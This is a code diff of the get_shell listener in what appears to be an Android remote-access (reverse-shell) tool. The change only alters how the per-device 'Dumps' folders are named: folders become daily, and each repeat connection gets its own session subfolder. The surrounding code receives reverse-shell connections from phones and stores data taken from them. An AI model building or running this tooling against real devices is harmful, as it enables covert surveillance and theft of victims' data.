@@ -1099,12 +1099,12 @@ def get_shell(ip,port):
                     model_part = welcome_data.split("welcome to reverse shell of")[1].strip()
                     device_model = model_part.replace("\n", "").replace(" ", "_")
                     
-                    # Add timestamp for uniqueness in case same model connects multiple times
-                    timestamp = time.strftime("%Y%m%d_%H%M%S")
-                    device_identifier = f"{device_model}_{timestamp}"
+                    # Clean up the device model - remove invalid characters
+                    device_model = "".join(c for c in device_model if c.isalnum() or c in "_-")
                     
-                    # Clean up the identifier - remove invalid characters
-                    device_identifier = "".join(c for c in device_identifier if c.isalnum() or c in "_-")
+                    # Create daily folder structure: DeviceModel_YYYYMMDD
+                    date_stamp = time.strftime("%Y%m%d")
+                    device_identifier = f"{device_model}_{date_stamp}"
                     
                     print(stdOutput("info")+f"Device identified: {model_part.strip()}")
                     welcome_msg = welcome_data
@@ -1112,20 +1112,35 @@ def get_shell(ip,port):
             except Exception as e:
                 print(stdOutput("warning")+f"Could not read welcome message: {e}")
             
-            # Fallback naming with IP and timestamp for uniqueness
+            # Fallback naming with IP and date for uniqueness
             if not device_identifier:
                 device_ip = addr[0].replace('.', '_')
-                timestamp = time.strftime("%Y%m%d_%H%M%S")
-                device_identifier = f"device_{device_ip}_{timestamp}"
+                date_stamp = time.strftime("%Y%m%d")
+                device_identifier = f"device_{device_ip}_{date_stamp}"
                 print(stdOutput("info")+f"Using fallback identifier: {device_identifier}")
             
-            # Create device folder
+            # Create device folder (daily folder)
             device_folder = f"Dumps/{device_identifier}"
             if not os.path.exists(device_folder):
                 os.makedirs(device_folder)
                 print(stdOutput("info")+f"Created device folder: {device_folder}")
             else:
                 print(stdOutput("info")+f"Using existing device folder: {device_folder}")
+                
+            # Create session subfolder for this specific connection
+            session_time = time.strftime("%H%M%S")
+            session_folder = f"{device_folder}/session_{session_time}"
+            
+            # Check if we should use session folders (only if there are already files in the daily folder)
+            existing_files = [f for f in os.listdir(device_folder) if os.path.isfile(os.path.join(device_folder, f))]
+            
+            if existing_files:
+                # There are already files, use session subfolder
+                if not os.path.exists(session_folder):
+                    os.makedirs(session_folder)
+                print(stdOutput("info")+f"Created session folder: {session_folder}")
+                device_folder = session_folder  # Use session folder for this connection
+            # Otherwise, use the daily folder directly
             
             # Reset timeout for normal operations
             conn.settimeout(10.0)
